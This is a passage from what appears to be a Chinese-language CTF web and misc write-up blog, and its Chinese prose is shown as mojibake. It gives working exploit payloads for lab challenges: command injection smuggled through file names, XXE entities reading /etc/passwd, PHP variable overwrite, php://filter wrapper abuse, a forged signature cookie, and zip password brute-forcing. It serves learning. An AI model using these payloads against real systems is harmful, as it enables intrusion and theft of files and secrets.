        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">False</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æç¤ºflagåœ¨.&#x2F;flag.txtä¸­</p>
<p>è¶…è¯¦ç»†wpï¼š[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13685940.html">De1CTF 2019]SSRF Me - My_Dreams - åšå®¢å›­ (cnblogs.com)</a></p>
<p>ä¸å¦¨å‡è®¾ secert_key æ˜¯ xxx ï¼Œé‚£ä¹ˆåœ¨å¼€å§‹è®¿é—® &#x2F;geneSign?param&#x3D;flag.txt çš„æ—¶å€™ï¼Œè¿”å›çš„ md5 å°±æ˜¯ md5(â€˜xxxâ€™ + â€˜flag.txtâ€™ + â€˜scanâ€™) ï¼Œåœ¨ python é‡Œé¢ä¸Šè¿°è¡¨è¾¾å¼å°±ç›¸å½“äº md5(xxxflag.txtscan) ï¼Œè¿™å°±å¾ˆæœ‰æ„æ€äº†ã€‚</p>
<p>ç›´æ¥æ„é€ è®¿é—® &#x2F;geneSign?param&#x3D;flag.txtread ï¼Œæ‹¿åˆ°çš„ md5 å°±æ˜¯ md5(â€˜xxxâ€™ + â€˜flag.txtreadâ€™ + â€˜scanâ€™) ï¼Œç­‰ä»·äº md5(â€˜xxxflag.txtreadscanâ€™) ï¼Œè¿™å°±è¾¾åˆ°äº†ç›®æ ‡ã€‚</p>
<p>ç›´æ¥è®¿é—® &#x2F;De1ta?param&#x3D;flag.txt æ„é€  Cookie: sign&#x3D;7a2a235fcc9218dfe21e4eb400a11b5e;action&#x3D;readscan</p>
<hr>
<h4 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h4><p>[perlè„šæœ¬ä¸­GETå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆ<a target="_blank" rel="noopener" href="https://www.codenong.com/cs105868449/">HITCON 2017]SSRFmeï¼‰ | ç å†œå®¶å›­ (codenong.com)</a></p>
<p>[åˆ·é¢˜<a target="_blank" rel="noopener" href="https://www.cnblogs.com/karsa/p/14111891.html">HITCON 2017]SSRFme - kar3a - åšå®¢å›­ (cnblogs.com)</a></p>
<p>è¿™é“é¢˜çš„è€ƒç‚¹æ˜¯ <code>GET</code> è¿™ä¸ªå‘½ä»¤çš„ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä¸»è¦æ˜¯ perl çš„ featureï¼Œåœ¨ open å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼š</p>
<p><img src="/images/ssrfme.png" alt="ssrfme.png"></p>
<p>é¦–å…ˆå®ƒä¼šè¿›å…¥sandbox&#x2F;æ–‡ä»¶å¤¹ç„¶åè¿›å…¥ä¸€ä¸ª æŠŠ â€œorange118.239.16.215â€ md5æ‘˜è¦å‘½åçš„æ–‡ä»¶å¤¹ã€‚å†ç„¶åæ‰§è¡Œä¸€ä¸ªâ€œGET +æˆ‘ä»¬ä¼ å…¥çš„urlå‚æ•°â€ è¿™ä¸ªå‘½ä»¤ã€‚æœ€åæŠŠæ‰§è¡Œçš„å‘½ä»¤å†™å…¥æˆ‘ä»¬ä¼ å…¥ä»¥æˆ‘ä»¬ä¼ å…¥çš„filenameä¸ºæ–‡ä»¶åçš„æ–‡ä»¶å†…ã€‚<br>â€ƒäº†è§£äº†åŸºæœ¬æµç¨‹å’Œä¸Šé¢è¯´çš„æ¼æ´åï¼Œæˆ‘çš„æ€è·¯æ˜¯ï¼š</p>
<ol>
<li><p>å…ˆåˆ›å»ºä¸€ä¸ªä»¥æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ä¸ºæ–‡ä»¶åçš„æ–‡ä»¶</p>
</li>
<li><p>ç„¶åæ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤</p>
</li>
<li><p>æŸ¥çœ‹æˆ‘ä»¬åˆ›å»ºçš„æ–‡ä»¶</p>
</li>
<li><p>ä½¿ç”¨2æ¬¡<code>?url=file:ls /|&amp;filename=ls /|</code> ç¬¬ä¸€æ¬¡æ˜¯ä¸ºäº†åˆ›å»º<code>ls /|</code> æ–‡ä»¶ç¬¬äºŒæ¬¡å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶æŠŠç»“æœå†™å…¥æ–‡ä»¶äº†ã€‚</p>
</li>
<li><p>è®¿é—®æ–‡ä»¶ï¼Œå…ˆå°†<code>orange118.239.16.215</code>md5ç„¶åå°±å¯ä»¥çŸ¥é“æ–‡ä»¶è·¯å¾„äº†æ‰§è¡Œ<code>/sandbox/b637d38ae20fabeb50aa7ca03ba02081/ls /|</code> å¯ä»¥çœ‹åˆ°æœ‰ä¸ª <code>readflag</code>,é‚£ä¹ˆå°±å°è¯•è¿è¡Œå®ƒå§ã€‚</p>
</li>
<li><p>è€æ ·å­æ‰§è¡Œ2é<code>?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</code></p>
</li>
<li><p>æ¥ç€å»è®¿é—®<code>/sandbox/b637d38ae20fabeb50aa7ca03ba02081/bash -c /readflag|</code> å³å¯ä»¥å¾—åˆ°æˆ‘ä»¬çš„flagã€‚</p>
</li>
</ol>
<p><code>bash -c</code>å¯ä»¥æ‰§è¡Œå‘½ä»¤</p>
<p><img src="/images/ssrfme2.png" alt="ssrfme2.png"></p>
<hr>
<h1 id="GITæ³„éœ²"><a href="#GITæ³„éœ²" class="headerlink" title="GITæ³„éœ²"></a>GITæ³„éœ²</h1><h4 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h4><p>dirsearchæ‰«åˆ°git æ³„éœ²ã€‚</p>
<p>flag.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>

<span class="token variable">$yds</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"dog"</span><span class="token punctuation">;</span>
<span class="token variable">$is</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"cat"</span><span class="token punctuation">;</span>
<span class="token variable">$handsome</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yds'</span><span class="token punctuation">;</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$$x</span> <span class="token operator">=</span> <span class="token variable">$y</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$$x</span> <span class="token operator">=</span> <span class="token variable">$$y</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$x</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$x</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$handsome</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$yds</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span>  <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$is</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"the flag is: "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‰ä¸¤ä¸ªforeachè¯­å¥åˆ†åˆ«å°†POSTå‚æ•°å’ŒGETå‚æ•°è¿›è¡Œå˜é‡è¦†ç›–ï¼Œæ¥ç€æ˜¯ä¸‰ä¸ªifè¯­å¥ï¼Œexit()å‡½æ•°é€€å‡ºè„šæœ¬çš„åŒæ—¶è¾“å‡ºå˜é‡ï¼Œæœ€åä¸€å¥æ˜¯è¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„flagã€‚<br>é¦–å…ˆæˆ‘ä»¬æƒ³åˆ°çš„æ˜¯è®©è„šæœ¬æ‰§è¡Œåˆ°æœ€åä¸€å¥<code>echo $flag</code>;ï¼Œä½†å³ä½¿ç»•è¿‡ä¸‰ä¸ªifè¯­å¥ï¼Œæˆ‘ä»¬GETä¼ å‚æˆ–è€…POSTä¼ å‚çš„flagæ€»ä¼šè¢«å˜é‡è¦†ç›–ï¼šå¦‚æˆ‘ä»¬GETä¼ å‚<code>flag=aaa</code>ï¼Œåœ¨ç¬¬äºŒä¸ªforeachè¯­å¥ä¸­å˜æˆ<code>$flag = $aaa</code>ï¼Œè€Œ<code>$aaa</code>å˜é‡æ²¡æœ‰å®šä¹‰ä¸ºç©ºï¼Œæœ€åçš„è¾“å‡ºå°±æ˜¯ç©ºåŒç†ï¼šæˆ‘ä»¬POSTä¼ å‚flag&#x3D;aaaï¼Œåœ¨ç¬¬ä¸€ä¸ªforeachè¯­å¥ä¸­å˜æˆ<code>$flag= aaa</code>ï¼Œflagè¢«è¦†ç›–ä¸ºâ€˜aaaâ€™ï¼Œæœ€åè¾“å‡ºaaa<br>ç”±æ­¤çœ‹æ¥ï¼Œè¿™æ ·è¡Œä¸é€šï¼Œå›è¿‡å¤´æ¥å‰é¢è¯´åˆ°ifè¯­å¥ä¸­çš„exit()å‡½æ•°è™½ç„¶ä¼šé€€å‡ºæ‰§è¡Œï¼Œä½†ä¹Ÿä¼šè¾“å‡ºå…¶å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å˜é‡è¦†ç›–å°†<code>exit()</code>å‡½æ•°å†…çš„å‚æ•°ç”¨<code>$flag</code>è¦†ç›–æ‰å°±èƒ½è¾“å‡ºflagäº†ï¼›<br>æ€è·¯ç†æ¸…äº†ï¼Œè¿™é‡Œé¢æœ‰ä¸‰ä¸ªifè¯­å¥ï¼Œå…¶ä¸­æœ‰ä¸¤ä¸ªèƒ½åˆ©ç”¨å˜é‡è¦†ç›–è¾“å‡ºflag,ä¹Ÿå°±æ˜¯è¯´æœ‰ä¸¤ç§æ–¹æ³•<br>ä¸€æ˜¯ç¬¬äºŒä¸ªifè¯­å¥ä¸­å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯è¾“å‡ºçš„<code>$yds</code>å˜é‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦é€šè¿‡å˜é‡è¦†ç›–è¾¾åˆ°<code>$yds=$flag</code>çš„æ•ˆæœï¼ŒGETä¼ å‚<code>yds=flag</code>ï¼Œåœ¨ç¬¬äºŒä¸ªforeachè¯­å¥ä¸­ï¼Œé¦–å…ˆæ˜¯<code>$x=yds</code>ï¼Œ<code>$y=flag</code>ï¼Œç»è¿‡<code>$$x = $$y</code>ä¹Ÿå°±å˜æˆäº†<code>$yds=$flag</code></p>
<p>äºŒæ˜¯ç¬¬ä¸‰ä¸ªifè¯­å¥ä¸­è¾“å‡ºå˜é‡<code>$is</code>ï¼Œåˆ¤æ–­æ¡ä»¶ä¸º<code>$_POST[&#39;flag&#39;] === &#39;flag&#39; || $_GET[&#39;flag&#39;] === &#39;flag&#39;</code>ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡æ»¡è¶³åé¢è¿™ä¸ªæ¡ä»¶è¿›è¡Œå˜é‡è¦†ç›–ï¼šGETä¼ å‚is&#x3D;flag&amp;flag&#x3D;flagï¼›åœ¨ç¬¬äºŒä¸ªforeachè¯­å¥ä¸­ï¼Œé¦–å…ˆæ˜¯<code>$x=is</code>,<code>$y=flag</code>,å¸¦è¿›å»å°±å˜æˆäº†<code>$is=$flag</code>ï¼Œè¿™å°±è¾¾åˆ°äº†è¦†ç›–çš„ç›®çš„ï¼Œè€Œå‚æ•°ä¸­flag&#x3D;flagåªæ˜¯ä¸ºäº†æ»¡è¶³ifè¯­å¥</p>
<hr>
<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><h4 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h4><p>å‚è€ƒé“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/175451.html">https://www.freebuf.com/vuls/175451.html</a></p>
<p>xeeå¤–éƒ¨å®ä½“ï¼Œæ„é€ æ¶æ„å®ä½“</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE note [
  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
  ]&gt;
&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;

&lt;!DOCTYPE note [
  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;
  ]&gt;
&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¯»å–flag</p>
<hr>
<h4 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h4><p>å†…ç½‘æ‰«æ</p>
<p>æ²¡åšå‡ºæ¥</p>
<p>file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;arp</p>
<p>10.128.253.12</p>
<p>169.254.1.1</p>
<hr>
<h1 id="Unicorn"><a href="#Unicorn" class="headerlink" title="Unicorn"></a>Unicorn</h1><h4 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h4><p>ä¹°ç‹¬è§’å…½ï¼Œä¹°ä¹°ä¹°å‘ç°å½“idæ˜¯4çš„æ—¶å€™è¿”å›<code>Only one char(?) allowed!</code></p>
<p>åªèƒ½è¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œè¿˜è¦å¾ˆå¤šçš„é’±</p>
<p><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/">Unicode - Compart</a></p>
<p>åœ¨ä¸Šé¢è¿™ä¸ªç½‘ç«™æœ<code>number</code>ï¼Œæ‰¾åˆ°Numeric Valueå¤§äºä»·æ ¼çš„å­—ç¬¦ï¼Œç„¶åèµ‹å€¼utf-8çš„å€¼ï¼ŒæŠŠ0xæ”¹æˆ%ï¼Œä¸­é—´ä¸ç•™ç©ºæ ¼ï¼Œæ‹¿åˆ°flag.</p>
<hr>
<h1 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h1><h4 id="ç¬¬ä¸€ç« -webå…¥é—¨-å¸¸è§çš„æœé›†"><a href="#ç¬¬ä¸€ç« -webå…¥é—¨-å¸¸è§çš„æœé›†" class="headerlink" title="[ç¬¬ä¸€ç«  webå…¥é—¨]å¸¸è§çš„æœé›†"></a>[ç¬¬ä¸€ç«  webå…¥é—¨]å¸¸è§çš„æœé›†</h4><p>robots.txt</p>
<p>index.php~</p>
<p>.index.php.swp</p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h4 id="äºŒç»´ç "><a href="#äºŒç»´ç " class="headerlink" title="äºŒç»´ç "></a>äºŒç»´ç </h4><p>ä¸‹è½½æ–‡ä»¶æ˜¯ä¸ªäºŒç»´ç ï¼Œä½¿ç”¨å·¥å…·QR_ResearchæŸ¥çœ‹ï¼Œå¹¶æ²¡æœ‰å‘ç°flagï¼Œç„¶åçŒœæµ‹æœ‰éšè—æ–‡ä»¶ï¼Œæ‰“å¼€kaliï¼Œä½¿ç”¨binwalkåˆ†ææ–‡ä»¶ã€‚</p>
<blockquote>
<p>binwalk QR_code.png</p>
</blockquote>
<p>æœç„¶å‘ç°æœ‰ä¸€ä¸ªzipï¼Œä½¿ç”¨foremostæ–‡ä»¶åˆ†ç¦»ã€‚</p>
<blockquote>
<p>foremost QR_code.png -o 111</p>
</blockquote>
<p>ç”Ÿæˆäº†111æ–‡ä»¶å¤¹ï¼Œçœ‹zipï¼Œè§£å‹éœ€è¦å¯†ç ï¼Œæ–‡ä»¶åå­—æ˜¯4number.txtï¼Œæç¤ºå¯†ç å¯èƒ½æ˜¯4ä¸ªæ•°å­—ï¼Œä½¿ç”¨&#x3D;&#x3D;fcrackzip&#x3D;&#x3D;æš´åŠ›ç ´è§£</p>
<blockquote>
<p>fcrackzip -b -c 1 -l 4-4 -u 00000000.zip </p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">å‚æ•°è§£é‡Šï¼š
-bï¼š			ä½¿ç”¨æš´åŠ›ç ´è§£
-c 1ï¼š			ä½¿ç”¨å­—ç¬¦é›†ï¼Œ1æŒ‡æ•°å­—é›†åˆ
-l 4-4ï¼š		æŒ‡å®šå¯†ç é•¿åº¦ï¼Œæœ€å°é•¿åº¦-æœ€å¤§é•¿åº¦
-uï¼š			ä¸æ˜¾ç¤ºé”™è¯¯å¯†ç ï¼Œä»…æ˜¾ç¤ºæœ€ç»ˆæ­£ç¡®å¯†ç <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ‹¿åˆ°flag</p>
<hr>
<h4 id="Nç§æ–¹æ³•è§£å†³"><a href="#Nç§æ–¹æ³•è§£å†³" class="headerlink" title="Nç§æ–¹æ³•è§£å†³"></a>Nç§æ–¹æ³•è§£å†³</h4><p><a target="_blank" rel="noopener" href="https://the-x.cn/base64/">Base64è§£ç  Base64ç¼–ç  UTF8 GB2312 UTF16 GBK äºŒè¿›åˆ¶ åå…­è¿›åˆ¶ è§£å¯† - The X åœ¨çº¿å·¥å…· (the-x.cn)</a></p>
<p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªexeæ–‡ä»¶ï¼Œç”¨è®°äº‹æœ¬æ‰“å¼€å‘ç°æœ‰base64åŠ å¯†ï¼Œè®¿é—®ä¸Šé¢çš„è¿æ¥è¿›è¡Œbase64è§£ç ï¼Œå¯ä»¥ç›´æ¥å¾—åˆ°ä¸€ä¸ªpngæ–‡ä»¶ï¼Œæ‰«æäºŒç»´ç å¾—åˆ°flag</p>
<hr>
<h4 id="åŸºç¡€ç ´è§£"><a href="#åŸºç¡€ç ´è§£" class="headerlink" title="åŸºç¡€ç ´è§£"></a>åŸºç¡€ç ´è§£</h4><p>è§£å‹zipï¼Œæç¤ºå¯†ç æ˜¯å››ä½æ•°å­—ï¼Œä½¿ç”¨è½¯ä»¶&#x3D;&#x3D;ARCHPR&#x3D;&#x3D; ,è¿›è¡Œæš´åŠ›ç ´è§£ï¼Œå¾—åˆ°å¯†ç ï¼Œè§£å‹ï¼Œbase64è§£ç ï¼Œå¾—åˆ°flag.</p>
<hr>
<h4 id="å¦å¤–ä¸€ä¸ªä¸–ç•Œ"><a href="#å¦å¤–ä¸€ä¸ªä¸–ç•Œ" class="headerlink" title="å¦å¤–ä¸€ä¸ªä¸–ç•Œ"></a>å¦å¤–ä¸€ä¸ªä¸–ç•Œ</h4><p><a target="_blank" rel="noopener" href="https://www.rapidtables.org/zh-CN/convert/number/ascii-hex-bin-dec-converter.html">ASCIIæ–‡æœ¬ï¼Œåå…­è¿›åˆ¶ï¼ŒäºŒè¿›åˆ¶ï¼Œåè¿›åˆ¶ï¼ŒBase64è½¬æ¢å™¨ (rapidtables.org)</a></p>
<p>ç”¨010editoræ‰“å¼€ï¼Œæ‹‰å€’æœ«å°¾ï¼Œå¤åˆ¶äºŒè¿›åˆ¶ï¼Œä¸¢åˆ°ä¸Šé¢çš„ç½‘ç«™è§£ç ï¼Œå¾—åˆ°flag</p>
<hr>
<h4 id="å¤§ç™½"><a href="#å¤§ç™½" class="headerlink" title="å¤§ç™½"></a>å¤§ç™½</h4><p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€å¼ å¤§ç™½çš„ç…§ç‰‡ï¼Œ&#x3D;&#x3D;PNGå›¾ç‰‡ä¿®å¤&#x3D;&#x3D;</p>
<p>ä½¿ç”¨è„šæœ¬</p>
<p><img src="/images/misc2.png" alt="misc2"></p>
<hr>
<h4 id="é¢å…·ä¸‹çš„flag"><a href="#é¢å…·ä¸‹çš„flag" class="headerlink" title="é¢å…·ä¸‹çš„flag"></a>é¢å…·ä¸‹çš„flag</h4><p>æ˜¯ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œç”¨binwalkåˆ†è§£ï¼Œæœ‰zipåŒ…ï¼Œæ˜¯ä¸ªä¼ªåŠ å¯†ã€‚</p>
<p><img src="/images/msic3.png" alt="msic3"></p>
<p>è§£å‹åå¾—åˆ°ä¸€ä¸ªflag.vmdkæ–‡ä»¶ï¼Œä½¿ç”¨å‘½ä»¤ï¼š</p>
<blockquote>
<p> 7z x flag.vmdk -o.&#x2F;</p>
</blockquote>
<p>è§£å‹åå¾—åˆ°key_part_oneå’Œkey_part_twoï¼Œåˆ†åˆ«å¾—åˆ°åŠ å¯†çš„ä¿¡æ¯ï¼š</p>
<p><img src="/images/misc4.png" alt="misc4"></p>
<p>[Brainfuck&#x2F;Ook! Obfuscation&#x2F;Encoding <a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">splitbrain.org]</a><a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a>)</p>
<p>è§£å¯†ç½‘ç«™</p>
<hr>
<h4 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h4><p>æ–‡ä»¶åˆ†ç¦»ï¼Œå¾—åˆ°zipæ–‡ä»¶ï¼Œè§£å‹å¾—åˆ°,keyå’Œcipherã€‚</p>
<p>keyé‡Œé¢æ˜¯base64ï¼Œè§£å¯†åç›´æ¥ç™¾åº¦ã€‚</p>
<p><a target="_blank" rel="noopener" href="http://serpent.online-domain-tools.com/">Serpent Encryption â€“ Easily encrypt or decrypt strings or files (online-domain-tools.com)</a></p>
<p>&#x3D;&#x3D;serpentåŠ å¯†&#x3D;&#x3D;</p>
<p>ä½¿ç”¨è¿™ä¸ªç½‘ç«™è§£ç </p>
<h1 id="â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”"><a href="#â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”" class="headerlink" title="â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”"></a>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</h1><h4 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h4><p>è¦ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼Œtext,file,passwordã€‚</p>
<p>ç¬¬ä¸€å±‚ï¼Œè¦ä½¿ä»¥textä¸ºè·¯å¾„çš„æ–‡ä»¶å†…å®¹ä¸ºwelcome to the zjctfï¼Œè¿™é‡Œç”¨åˆ°dataåè®®å†™å…¥ï¼Œå³<code>?text=data://text/plain,welcome to the zjctf</code></p>
<p>ç¬¬äºŒå±‚ï¼Œå¯¹fileè¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œä¸èƒ½å‡ºç°flagï¼Œé‚£æˆ‘ä»¬è®¿é—®ä¸€ä¸‹æç¤ºçš„useless.phpï¼Œè¿™é‡Œä½¿ç”¨phpä¼ªåè®®ï¼Œå³<code>file=php://filter/convert.base64-encode/resource=useless.php</code></p>
<p>ç¬¬ä¸‰å±‚ï¼Œæ‹¿åˆ°useless.phpçš„æºä»£ç åï¼Œå‘ç°è¦æ„é€ åºåˆ—åŒ–è¯­å¥ï¼Œè¿™é‡Œå¾ˆå®¹æ˜“ï¼Œè‡ªå·±å†™ä¸ªexpå°±è¡Œ</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Flag</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>å°†åºåˆ—åŒ–åçš„å€¼ç»™passwordã€‚</p>
